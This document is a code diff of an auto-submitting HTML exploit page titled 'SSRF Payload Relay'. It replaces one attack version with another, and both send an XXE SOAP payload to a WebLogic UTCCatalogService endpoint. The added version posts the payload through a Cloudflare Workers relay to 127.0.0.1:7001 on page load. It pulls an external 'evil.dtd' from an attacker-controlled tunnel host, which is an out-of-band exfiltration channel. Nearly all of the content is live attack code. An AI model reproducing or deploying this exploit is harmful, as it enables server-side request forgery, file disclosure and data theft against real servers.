@@ -1,44 +1,38 @@
-<script>
-  const domain = 'ssrf1.duckdns.org';
-  const port = 7001;
-  const path = '/ws_utc/services/UTCCatalogService';
-  const fullUrl = `http://${domain}:${port}${path}`;
+<!DOCTYPE html>
+<html>
+<head>
+  <title>SSRF Payload Relay</title>
+  <script>
+    window.onload = function () {
+      const form = document.createElement('form');
+      form.method = 'POST';
+      form.action = 'https://empty-sky-37bc.suvamc.workers.dev/?url=http://127.0.0.1:7001/ws_utc/services/UTCCatalogService';
 
-  const xmlPayload = `
-  <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
-    <soapenv:Header/>
-    <soapenv:Body>
-      <xxe xmlns="x"><![CDATA[
-        <!DOCTYPE root [
-          <!ENTITY % xxe SYSTEM "https://okay-blood-gradually-remedy.trycloudflare.com/evil.dtd">
-          %xxe;
-        ]>
-      ]]></xxe>
-    </soapenv:Body>
-  </soapenv:Envelope>
-  `;
+      const xml = `
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+  <!ENTITY % ext SYSTEM "https://okay-blood-gradually-remedy.trycloudflare.com/evil.dtd">
+  %ext;
+]>
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
+  <soapenv:Header/>
+  <soapenv:Body>
+    <runSSRF>&send;</runSSRF>
+  </soapenv:Body>
+</soapenv:Envelope>`.trim();
 
-  const form = document.createElement('form');
-  form.action = fullUrl;
-  form.method = 'POST';
-  form.enctype = 'text/xml';
-  form.target = 'hiddenFrame';
+      const input = document.createElement('input');
+      input.type = 'hidden';
+      input.name = 'payload';
+      input.value = xml;
 
-  const input = document.createElement('input');
-  input.type = 'hidden';
-  input.name = 'data';
-  input.value = xmlPayload;
-  form.appendChild(input);
-
-  document.body.appendChild(form);
-
-  const iframe = document.createElement('iframe');
-  iframe.name = 'hiddenFrame';
-  iframe.style.display = 'none';
-  document.body.appendChild(iframe);
-
-  setTimeout(() => {
-    form.submit();
-    document.getElementById("log").innerText = `📡 SSRF POST fired: ${fullUrl}`;
-  }, 1000);
-</script>
+      form.appendChild(input);
+      document.body.appendChild(form);
+      form.submit();
+    };
+  </script>
+</head>
+<body>
+  <h1>SSRF Exploit Launching...</h1>
+</body>
+</html>
